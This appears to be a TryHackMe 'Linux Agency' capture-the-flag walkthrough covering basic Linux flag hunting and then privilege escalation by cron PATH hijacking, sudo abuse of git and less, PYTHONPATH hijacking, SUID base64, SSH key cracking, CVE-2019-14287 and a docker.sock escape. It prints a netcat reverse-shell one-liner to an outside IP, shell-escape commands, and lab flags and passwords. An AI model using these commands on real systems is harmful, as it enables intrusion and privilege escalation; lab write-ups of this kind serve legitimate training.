# TryHackMe-Linux Agency

First we are told to ssh into the box using the creds

username:agent47
password:640509040147


<img src="https://imgur.com/xTq6FqL.png"/>


## Linux Fundamentals

### Mission 1 Flag

As from the ssh banner we got the flag for mission 1

### Mission 2 Flag

Use the previous flag to login to `mission1` user

<img src="https://imgur.com/EUFK3OM.png"/>

In mission1's home directory you will find the flag for mission2 and you can the login with it to next user or in this case next mission

<img src="https://imgur.com/Uilbkxk.png"/>

### Mission 3 flag

<img src="https://imgur.com/ZBZ0UME.png"/>

Going to mission'2 home directory you will see `flag.txt` which holds flag for this mission

<img src="https://imgur.com/tfQW2DS.png"/>

### Mission 4 flag

Switch user to mission3 with the previous flag found

<img src="https://imgur.com/RdS5U80.png"/>

<img src="https://imgur.com/k2Zrcu3.png"/>

It seems there is no flag in the text file this time so we need to search around for the flag

Running `grep -rnw /home  -e 'mission4'` I saw end of the flag in the same message  

<img src="https://imgur.com/oThx6R9.png"/>

Opening it with `vi` editor I found the flag

<img src="https://imgur.com/EbD6idr.png"/>

### Mission 5 flag

Switch user to mission4 with the flag found

<img src="https://imgur.com/vPcGX4E.png"/>

Head over to mission's 5 home directory

<img src="https://imgur.com/QGjDon3.png"/>

And you'll find flag for the next mission

### Mission 6 flag

<img src="https://imgur.com/RmvIRjd.png"/>

<img src="https://imgur.com/nvk6be0.png"/>

### Mission 7 flag

<img src="https://imgur.com/m6IPueX.png"/>

<img src="https://imgur.com/ATbiM1N.png"/>

This was quite easy because all we have to do is `ls -la`

### Mission 8 flag

Using the previous flag switch to mission7 user

<img src="https://imgur.com/WYhHidT.png"/>

<img src="https://imgur.com/NRxf4zD.png"/>

### Mission 9 flag

<img src="https://imgur.com/wqWusfV.png"/>

<img src="https://imgur.com/632brR9.png"/>

There was no flag in the home directory let's see if we can find anything in root directory (/)

<img src="https://imgur.com/Hvesy2M.png"/>

### Mission 10 flag

<img src="https://imgur.com/cZ67Oj0.png"/>

<img src="https://imgur.com/MmF7QML.png"/>

We only see `rockyou.txt`

Doing a grep for `mission10` you will find your flag

<img src="https://imgur.com/7nHHjTB.png"/>

### Mission 11 flag

<img src="https://imgur.com/mNvTfst.png"/>

<img src="https://imgur.com/h4H27x0.png"/>

We see a bunch of directories in mission10's home directory so we have to look for mission11 string in these directories

<img src="https://imgur.com/n9dbHGO.png"/>

### Mission 12 flag

<img src="https://imgur.com/s9T3Isy.png"/>

Reading `.bashrc` 

<img src="https://imgur.com/51JCnZg.png"/>


### Mission 13 flag

<img src="https://imgur.com/d45ffiJ.png"/>

`flag.txt` is in home directory of mission13 but it doesn't have any permission so use chmod to change permissions

<img src="https://imgur.com/coY9MxC.png"/>


### Mission 14 flag

<img src="https://imgur.com/7SU1prM.png"/>

<img src="https://imgur.com/FjVcgVJ.png"/>

### Mission 15 flag

<img src="https://imgur.com/ghBKGwL.png"/>

<img src="https://imgur.com/Sp8staT.png"/>

This is looking like stream of binary so let's hop over to cyberchef

<img src="https://imgur.com/H0J3Bnm.png"/>


### Mission 16 flag

<img src="https://imgur.com/aGoga97.png"/>


<img src="https://imgur.com/fZkR77q.png"/>

This representation looks like hex because of `D` in the string

<img src="https://imgur.com/M2039Xd.png"/>

### Mission 17 flag

<img src="https://imgur.com/ATcVLEu.png"/>

<img src="https://imgur.com/IU8TbX5.png"/>

Here we have a `flag` binary but doesn't have any permissions so set execute flag on the binary 

<img src="https://imgur.com/iWGnP27.png"/>

### Mission 18 flag

<img src="https://imgur.com/9vw9gWp.png"/>

<img src="https://imgur.com/QpZjX8u.png"/>

It seems we have an ecnrypted string and which is being decrpyted so we need to run the java file to get the flag

<img src="https://imgur.com/Y829W2X.png"/>

### Mission 19 flag

<img src="https://imgur.com/DQMMd2i.png"/>

<img src="https://imgur.com/LvECvJz.png"/>

Here we have the same scenario but it is written in `ruby` language

<img src="https://imgur.com/cETObhD.png"/>

### Mission 20 flag

<img src="https://imgur.com/dV5KtQ6.png"/>

<img src="https://imgur.com/Fi9t3PG.png"/>

Again same thing we need to compile the c program and run it 

<img src="https://imgur.com/G4iBuKu.png"/>

### Mission 21 flag

<img src="https://imgur.com/G1oLob6.png"/>

<img src="https://imgur.com/ekyM2g9.png"/>

<img src="https://imgur.com/4mWNCws.png"/>

### Mission 22 flag

<img src="https://imgur.com/6C6tdKu.png"/>

<img src="https://imgur.com/XyEDeft.png"/>

Again the flag is hidden in `.bashrc`

### Mission 23 flag

<img src="https://imgur.com/76pgQ55.png"/>

We get spawn into a python interactive shell

<img src="https://imgur.com/bqEYc91.png"/>

<img src="https://imgur.com/Qq4kFG6.png"/>

### Mission 24 flag

<img src="https://imgur.com/IZT3V73.png"/>

<img src="https://imgur.com/dufKmce.png"/>

We get a message from text file but I didn't get it until I saw `/etc/hosts`

<img src="https://imgur.com/csntxIY.png"/>

Where localhost was resolving into `mission24.com` which tells that there is a webpage

<img src="https://imgur.com/4k8d8lC.png"/>

### Mission 25 flag

<img src="https://imgur.com/vHrRzP6.png"/>

<img src="https://imgur.com/WXOnyfu.png"/>

Here `bribe` is a binary file so on running

<img src="https://imgur.com/UZV9lVM.png"/>

Transfer the binary to your machine for analyzing 

<img src="https://imgur.com/xig1Y5y.png"/>

<img src="https://imgur.com/yWK94rl.png"/>

Right in the beginning we can it's storing an evniromental variable in a variable named `_s1` and it's checking if it contains the string "money" so we just have to export a variable named pocket with value money in terminal

<img src="https://imgur.com/aGsH8Ps.png"/>


### Mission 26 flag

<img src="https://imgur.com/Staohbt.png"/>

This tells me that there is something wrong with the PATH so let's export the PATH

<img src="https://imgur.com/iOXJZUm.png"/>

<img src="https://imgur.com/MXQoxzb.png"/>

### Mission 27 flag

<img src="https://imgur.com/Y0Wr41t.png"/>

<img src="https://imgur.com/MUuJCiH.png"/>

Running the `strings` command on the jpg file we will get our flag

<img src="https://imgur.com/uXZxvZ8.png"/>

### Mission 28 flag

<img src="https://imgur.com/jh8zS0M.png"/>

<img src="https://imgur.com/GhsOC7w.png"/>

Extract the archive (gzip) file I have transfered it to my machine 

<img src="https://imgur.com/28qUnBe.png"/>

Then use hexeditor to view the content in the jpg file which is acutally a gif image file

<img src="https://imgur.com/MtNWNPu.png"/>

### Mission 29 flag

<img src="https://imgur.com/elSXq4U.png"/>

<img src="https://imgur.com/oFTn1NU.png"/>

This `irb` is a ruby prompt

<img src="https://imgur.com/wdJvCje.png"/>

<img src="https://imgur.com/udbY3Om.png"/>


### Mission 30 flag

<img src="https://imgur.com/GzQqd9P.png"/>

<img src="https://imgur.com/i8YSaHk.png"/>


### Vikto's Flag

<img src="https://imgur.com/ktsMZJA.png"/>

<img src="https://imgur.com/88TpK3Q.png"/>

viktor{b52c60124c0f8f85fe647021122b3d9a}

## Privilege Escalation

### What is dalia's flag?

<img src="https://imgur.com/JqQx072.png"/>

<img src="https://imgur.com/LTsdoUq.png"/>

We can see a cronjob in which script is running as user `dalia`

But when we try to overwrite the content of the `47.sh` script it will not be executed because it is being paused with sleep 30 which wil pause the execution for 30 seconds and at the same the the same script will be overwritten as a root user and then the ownership will be changed to `viktor` so we need to somehow prevent the `sleep` command so we exploit PATH variable and replace the sleep command with anything 

<img src="https://imgur.com/Lt6PAD5.png"/>

Here as you can see I made a sleep file in which I just added a `bash` command which will not spawn a shell but will overwrite the actual sleep command

Added PATH variable for that file

<img src="https://imgur.com/9385ODD.png"/>

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.54.209 1234 >/tmp/f

Add a netcat reverse shell

<img src="https://imgur.com/5s8cllq.png"/>

<img src="https://imgur.com/05W1VmY.png"/>

And boom we get a shell as user `dalia`


### What is silvio's flag?

Doing `sudo -l`

<img src="https://imgur.com/xAcO6ud.png"/>

We can see that this user can run `zip` as user `silvio`

<img src="https://imgur.com/rH3rg0t.png"/>

<img src="https://imgur.com/6kwOM7b.png"/>

silvio{657b4d058c03ab9988875bc937f9c2ef}

### What is reza's flag?

Running `sudo -l` on this user

<img src="https://imgur.com/5yCGbUT.png"/>

Now we will be able to escalate our privileges to rez through `git`

<img src="https://imgur.com/PvGii08.png"/>

```
sudo -u reza PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help

```
<img src="https://imgur.com/6bpBaQz.png"/>

<img src="https://imgur.com/XyPatAi.png"/>

reza{2f1901644eda75306f3142d837b80d3e}

### What is jordan's flag?

<img src="https://imgur.com/jSAYt8e.png"/>

Now this time we can run a python script as user `jordan`

<img src="https://imgur.com/iUQz8pE.png"/>

On running we get an error because there is no python module named `shop`. What we can do is create a python module in the same directory where the script is and in it spawn a shell.

```
echo 'import os;os.system("/bin/bash")'  > shop.py
```
But what is happening with SETENV is that it's setting the PYTHONPATH to default  `SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py` which will lead us to PYTHONPATH Hijacking

<img src="https://imgur.com/DbJJHJJ.png"/>

<img src="https://imgur.com/3EHr1RF.png"/>

### What is ken's flag?

<img src="https://imgur.com/ClvSPdr.png"/>

Here we can see less can be run as user `ken` so we can utilize to escalate our privileges

<img src="https://imgur.com/MXjdm57.png"/>

<img src="https://imgur.com/hIgZs0U.png"/>

<img src="https://imgur.com/VkzsnO0.png"/>

<img src="https://imgur.com/rdkP1gb.png"/>

### What is sean's flag?

<img src="https://imgur.com/Av689pv.png"/>

This one is pretty easy similar to less and this is one of the most common privilege escaltion we encounter in CTF's

<img src="https://imgur.com/XGPqsXB.png"/>

Then just do `!/bin/sh`

<img src="https://imgur.com/uXrKk38.png"/>

<img src="https://imgur.com/OdioY84.png"/>

But we don't see any flag here. Looking at the groups for sean we see that he belongs to `adm` which can look on system logs

<img src="https://imgur.com/VLztrEt.png"/>

<img src="https://imgur.com/et8GGtP.png"/>

### What is penelope's flag?

Switch user to `penelope` with the password found in the logs which is base64 enccoded p3nelope 

<img src="https://imgur.com/fCP74tO.png"/>

<img src="https://imgur.com/b62xcM8.png"/>

### What is maya's flag?

Since that `base64` binary has an SUID so we can read any file by encoding it through base64 and then decoding it

<img src="https://imgur.com/cnjg7JY.png"/>

### What is robert's Passphrase?

<img src="https://imgur.com/cQ7UJI4.png"/>

<img src="https://imgur.com/8Mh8y0p.png"/>

We see ssh keys , if your faimilar with ssh keys usually when we login with id_rsa it can sometimes be protected with a passpharse so let's transfer the private key to our machine and give it to ssh2john so we can get a hash and then crack it with johntheripper

<img src="https://imgur.com/Vx0DYzI.png"/>

<img src="https://imgur.com/VXabnAp.png"/>

<img src="https://imgur.com/3Q41Jgc.png"/>

And we found the passphrase!. industryweapon

<img src="https://imgur.com/Vi3MqZa.png"/>

### What is user.txt?

Here it says about `entrypoint at localhost` 

<img src="https://imgur.com/8DS3kq6.png"/>

We can see 2 local ports that is intersting , we already saw port 80 now lets see what service is running on port 2222

<img src="https://imgur.com/m07Gqvb.png"/>

SSH is running so we can try to login as `robert ` using the private key along with the passphrase

<img src="https://imgur.com/5hG9kVw.png"/>

<img src="https://imgur.com/P3B6GTL.png"/>

Checking for what robert can run as a superuser in docker environment

<img src="https://imgur.com/TT8ZTxA.png"/>

Since sudo version is 1.8.21 and we can see there is `!` in sudoers there is a CVE for this which is `CVE-2019-14287 `

<img src="https://imgur.com/eZXOg4i.png"/>

<img src="https://imgur.com/IJBhAuW.png"/>

### What is root.txt?

<img src="https://imgur.com/Xgr7Jw3.png"/>

When we try to see what is the image name for docker conatainer we get a permission denied

<img src="https://imgur.com/SiDgD7p.png"/>

To overcome this we need change permisisons of docker.sock which is used to communicate with the main docker daemon (process) by default. It is the entry point for a Docker API. This socket is used by Docker CLI by default to execute docker commands. Default location for the socket is `/run/docker.sock`

<img src="https://imgur.com/hRW0ZxP.png"/>

Now if we do `docker images`

<img src="https://imgur.com/W9jMlbG.png"/>

We can see the name so now we can mount the host file system on the docker container

<img src="https://imgur.com/nDJKqkv.png"/>


### Becoming root on the host machine

Since we have mounted the host file system on the docker container and we are root we can pretty much do anything , for example if I modify sudoers file it will take effect on the actual host machine so what we can do is edit the maya user's premisison to let me execute anything 

<img src="https://imgur.com/Z4AfQbo.png"/>

<img src="https://imgur.com/wxzwJ8a.png"/>